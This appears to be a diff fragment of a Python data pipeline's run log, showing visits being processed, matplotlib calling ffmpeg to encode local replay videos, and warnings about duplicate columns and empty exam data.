+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1807_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1807_replay.mp4']
+/home/ubuntu/reactrack/matviz/matviz/etl.py:340: RuntimeWarning: invalid value encountered in true_divide
+  outt = ys/enss
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1808_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1808_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1809_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1809_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1810_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1810_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1813_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/8c139159-50fa-48ff-9499-4d5377a705b1/figures/1813_replay.mp4']
+INFO:root:Processing: 96855d70-c750-4813-b02d-164b46320200
+Processing: 96855d70-c750-4813-b02d-164b46320200
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2075_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2075_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2076_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2076_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2077_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2077_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2078_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2078_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2079_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/96855d70-c750-4813-b02d-164b46320200/figures/2079_replay.mp4']
+INFO:root:Processing: e6127a54-08f3-43e3-8e1c-dd7c17107d67
+Processing: e6127a54-08f3-43e3-8e1c-dd7c17107d67
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1825
+visit_exam_id: 1825
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1827
+visit_exam_id: 1827
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1823_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1823_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1824_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1824_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1826_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/e6127a54-08f3-43e3-8e1c-dd7c17107d67/figures/1826_replay.mp4']
+INFO:root:Processing: 3d26471c-4301-4597-9de4-82bca5c4fcc2
+Processing: 3d26471c-4301-4597-9de4-82bca5c4fcc2
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2400_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2400_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2401_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2401_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2402_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2402_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2403_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2403_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2404_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3d26471c-4301-4597-9de4-82bca5c4fcc2/figures/2404_replay.mp4']
+INFO:root:Processing: 91ad10d7-8b5b-42e4-9f44-8f31b34a624c
+Processing: 91ad10d7-8b5b-42e4-9f44-8f31b34a624c
+WARNING:root:Empty data for visit_exam_id: 2190
+Empty data for visit_exam_id: 2190
+WARNING:root:Empty data for visit_exam_id: 2191
+Empty data for visit_exam_id: 2191
+WARNING:root:Empty data for visit_exam_id: 2192
+Empty data for visit_exam_id: 2192
+WARNING:root:Empty data for visit_exam_id: 2193
+Empty data for visit_exam_id: 2193
+WARNING:root:Empty data for visit_exam_id: 2194
+Empty data for visit_exam_id: 2194
+WARNING:root:Empty data for visit_exam_id: 2195
+Empty data for visit_exam_id: 2195
+WARNING:root:No data to report for visit_id: 91ad10d7-8b5b-42e4-9f44-8f31b34a624c
+No data to report for visit_id: 91ad10d7-8b5b-42e4-9f44-8f31b34a624c
+INFO:root:Processing: 76c70cd7-a495-4153-a25d-a1ad6a197d0e
+Processing: 76c70cd7-a495-4153-a25d-a1ad6a197d0e
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2635_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2635_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2636_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2636_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2637_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2637_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2638_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2638_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2639_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/76c70cd7-a495-4153-a25d-a1ad6a197d0e/figures/2639_replay.mp4']
+INFO:root:Processing: 09e2c477-7d00-48c7-b3c0-3af9336f15f6
+Processing: 09e2c477-7d00-48c7-b3c0-3af9336f15f6
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2641_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2641_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2642_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2642_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2643_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2643_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2644_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2644_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2645_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09e2c477-7d00-48c7-b3c0-3af9336f15f6/figures/2645_replay.mp4']
+INFO:root:Processing: c122511c-462d-408b-aed0-999d61e03eca
+Processing: c122511c-462d-408b-aed0-999d61e03eca
+WARNING:root:Empty data for visit_exam_id: 2473
+Empty data for visit_exam_id: 2473
+WARNING:root:Empty data for visit_exam_id: 2474
+Empty data for visit_exam_id: 2474
+WARNING:root:Empty data for visit_exam_id: 2475
+Empty data for visit_exam_id: 2475
+WARNING:root:Empty data for visit_exam_id: 2476
+Empty data for visit_exam_id: 2476
+WARNING:root:Empty data for visit_exam_id: 2477
+Empty data for visit_exam_id: 2477
+INFO:root:Processing: bf265805-b15f-43eb-8518-33f95fa8c382
+Processing: bf265805-b15f-43eb-8518-33f95fa8c382
+WARNING:root:Empty data for visit_exam_id: 2328
+Empty data for visit_exam_id: 2328
+WARNING:root:Empty data for visit_exam_id: 2329
+Empty data for visit_exam_id: 2329
+WARNING:root:Empty data for visit_exam_id: 2330
+Empty data for visit_exam_id: 2330
+WARNING:root:Empty data for visit_exam_id: 2331
+Empty data for visit_exam_id: 2331
+WARNING:root:Empty data for visit_exam_id: 2332
+Empty data for visit_exam_id: 2332
+INFO:root:Processing: 738d26e0-cb44-4d73-b8bd-3d76063bf840
+Processing: 738d26e0-cb44-4d73-b8bd-3d76063bf840
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1939_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1939_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1940_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1940_replay.mp4']
+WARNING:root:Issue analysis @ Line 382
+Issue analysis @ Line 382
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1941_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/738d26e0-cb44-4d73-b8bd-3d76063bf840/figures/1941_replay.mp4']
+INFO:root:Processing: d97e7d40-44ab-47fd-b285-78e4aa1dc868
+Processing: d97e7d40-44ab-47fd-b285-78e4aa1dc868
+WARNING:root:Empty data for visit_exam_id: 2274
+Empty data for visit_exam_id: 2274
+WARNING:root:Empty data for visit_exam_id: 2275
+Empty data for visit_exam_id: 2275
+WARNING:root:Empty data for visit_exam_id: 2276
+Empty data for visit_exam_id: 2276
+WARNING:root:Empty data for visit_exam_id: 2277
+Empty data for visit_exam_id: 2277
+WARNING:root:Empty data for visit_exam_id: 2278
+Empty data for visit_exam_id: 2278
+INFO:root:Processing: 83fed993-886a-4331-ad8a-57bfb94a1581
+Processing: 83fed993-886a-4331-ad8a-57bfb94a1581
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2322_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2322_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2323_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2323_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2324_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2324_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2325_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2325_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2326_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/83fed993-886a-4331-ad8a-57bfb94a1581/figures/2326_replay.mp4']
+INFO:root:Processing: 576a6e4b-c466-4c6f-840a-6717aac98ed5
+Processing: 576a6e4b-c466-4c6f-840a-6717aac98ed5
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1831
+visit_exam_id: 1831
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 1833
+visit_exam_id: 1833
